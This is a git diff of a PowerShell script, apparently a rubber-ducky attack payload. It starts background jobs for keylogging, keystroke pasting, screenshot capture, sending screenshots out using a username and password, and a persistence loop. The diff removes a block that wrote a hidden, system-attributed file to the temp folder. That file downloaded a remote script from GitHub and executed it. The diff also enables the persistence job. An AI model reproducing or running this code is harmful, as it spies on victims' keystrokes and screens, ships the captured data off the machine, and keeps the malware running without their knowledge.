@@ -343,6 +343,16 @@ $functions =  {
 	
 	function script:MaintainPersistence
 	{
+		Param ( 
+            [Parameter(Position = 0, Mandatory = $True)]
+            [String]
+            $username,
+
+            [Parameter(Position = 1, Mandatory = $True)]
+            [String]
+            $password
+        )
+		
 		while($true)
 		{
 			$modulename = "34F3E433-9DE0-4930-AF3F-D099EF30490B.ps1"
@@ -365,21 +375,9 @@ $functions =  {
 		}
 	}
 }
-
-$modulename = "34F3E433-9DE0-4930-AF3F-D099EF30490B.ps1"
-			
-$modulenamepath = "$env:TEMP\$modulename"
-$namepath = "$env:TEMP\$name"
-
-if(-Not ([System.IO.File]::Exists($modulenamepath)))
-{
-	Out-File -InputObject '$scriptPath = ((New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/gengstah/rubber-ducky/master/keys.ps1"))' -Force $env:TEMP\$modulename
-	Out-File -InputObject 'Invoke-Command -ScriptBlock ([scriptblock]::Create($scriptPath)) -ArgumentList $username, $password' -Append -NoClobber $env:TEMP\$modulename
-	$modulenamefile = Get-Item $env:TEMP\$modulename
-	$modulenamefile.Attributes="Hidden","System"
-}
+	
 start-job -InitializationScript $functions -scriptblock {Keypaste $args[0] $args[1]} -ArgumentList @($username,$password)
 start-job -InitializationScript $functions -scriptblock {Keylogger}
-#start-job -InitializationScript $functions -scriptblock {MaintainPersistence}
+start-job -InitializationScript $functions -scriptblock {MaintainPersistence $args[0] $args[1]} -ArgumentList @($username,$password)
 start-job -InitializationScript $functions -scriptblock {Screenshot}
 start-job -InitializationScript $functions -scriptblock {SendScreenshots $args[0] $args[1]} -ArgumentList @($username,$password)
